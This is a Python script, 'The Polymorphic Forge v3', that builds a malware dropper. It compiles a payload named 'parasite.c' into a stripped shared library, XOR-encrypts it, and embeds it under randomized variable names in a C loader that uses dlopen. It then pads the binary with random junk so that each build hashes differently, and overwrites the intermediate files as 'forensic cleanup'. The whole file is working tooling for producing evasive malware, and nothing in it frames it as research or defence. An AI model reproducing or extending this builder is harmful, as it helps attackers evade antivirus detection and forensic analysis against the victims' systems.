import os
import sys
import subprocess
import secrets
import string
import hashlib

# Configuración
PAYLOAD_SRC = "payload_src/parasite.c"
TEMP_PAYLOAD_SO = "temp_ghost.so"
LOADER_TEMPLATE = "loader_template.c"
OUTPUT_C_FILE = "dropper_generated.c"
OUTPUT_BIN = "dropper"

def generate_random_name(length=8):
    alphabet = string.ascii_letters + string.digits
    return 'v_' + ''.join(secrets.choice(alphabet) for _ in range(length))

def compile_payload():
    print(f"[*] Compiling payload {PAYLOAD_SRC} -> {TEMP_PAYLOAD_SO}...")
    cmd = [
        "gcc",
        "-shared", "-fPIC",
        "-s", "-Os", "-fvisibility=hidden",
        "-o", TEMP_PAYLOAD_SO,
        PAYLOAD_SRC,
        "-lpthread" # Needed for thread functions in parasite
    ]
    try:
        subprocess.check_call(cmd)
    except subprocess.CalledProcessError as e:
        print(f"[!] Payload compilation failed: {e}")
        sys.exit(1)

def encrypt_payload(key):
    print("[*] Encrypting payload...")
    with open(TEMP_PAYLOAD_SO, "rb") as f:
        data = bytearray(f.read())

    key_len = len(key)
    for i in range(len(data)):
        data[i] ^= key[i % key_len]

    return data

def generate_c_code(encrypted_data, key):
    key_var_name = generate_random_name()
    payload_var_name = generate_random_name()

    # Format C arrays
    key_array_str = ", ".join(f"0x{b:02x}" for b in key)
    payload_array_str = ", ".join(f"0x{b:02x}" for b in encrypted_data)

    secrets_block = f"""
unsigned char {key_var_name}[] = {{ {key_array_str} }};
unsigned char {payload_var_name}[] = {{ {payload_array_str} }};
#define KEY_LEN_VAL {len(key)}
#define PAYLOAD_LEN_VAL {len(encrypted_data)}
    """

    with open(LOADER_TEMPLATE, "r") as f:
        template = f.read()

    code = template.replace("{{SECRETS_BLOCK}}", secrets_block)
    code = code.replace("{{KEY_VAR_NAME}}", key_var_name)
    code = code.replace("{{PAYLOAD_VAR_NAME}}", payload_var_name)
    code = code.replace("{{PAYLOAD_LEN_MACRO}}", "PAYLOAD_LEN_VAL")
    code = code.replace("{{KEY_LEN_MACRO}}", "KEY_LEN_VAL")

    with open(OUTPUT_C_FILE, "w") as f:
        f.write(code)
    print(f"[*] Generated polymorphic C source: {OUTPUT_C_FILE}")

def compile_dropper():
    print(f"[*] Compiling dropper -> {OUTPUT_BIN}...")
    cmd = [
        "gcc",
        "-no-pie", "-fvisibility=hidden", "-s",
        "-o", OUTPUT_BIN,
        OUTPUT_C_FILE,
        "-ldl" # Needed for dlopen
    ]
    try:
        subprocess.check_call(cmd)
    except subprocess.CalledProcessError as e:
        print(f"[!] Dropper compilation failed: {e}")
        sys.exit(1)

def add_junk_padding():
    junk_size = secrets.randbelow(1024 * 10) # 0 to 10KB
    print(f"[*] Adding {junk_size} bytes of junk padding...")
    with open(OUTPUT_BIN, "ab") as f:
        f.write(secrets.token_bytes(junk_size))

def cleanup():
    print("[*] Performing forensic cleanup...")
    files_to_wipe = [TEMP_PAYLOAD_SO, OUTPUT_C_FILE]
    for fpath in files_to_wipe:
        if os.path.exists(fpath):
            # Shred simulation (overwrite with zeros)
            file_size = os.path.getsize(fpath)
            with open(fpath, "wb") as f:
                f.write(b'\x00' * file_size)
            os.remove(fpath)

def main():
    print("--- THE POLYMORPHIC FORGE v3 ---")

    # 1. Compile Payload
    compile_payload()

    # 2. Generate Key & Encrypt
    key = secrets.token_bytes(16)
    encrypted_data = encrypt_payload(key)

    # 3. Generate C Code
    generate_c_code(encrypted_data, key)

    # 4. Compile Dropper
    compile_dropper()

    # 5. Padding
    add_junk_padding()

    # 6. Verify & Hash
    with open(OUTPUT_BIN, "rb") as f:
        digest = hashlib.sha256(f.read()).hexdigest()
    print(f"[*] Dropper SHA-256: {digest}")

    # 7. Cleanup
    cleanup()
    print("[*] Build Success. Happy Hunting.")

if __name__ == "__main__":
    main()
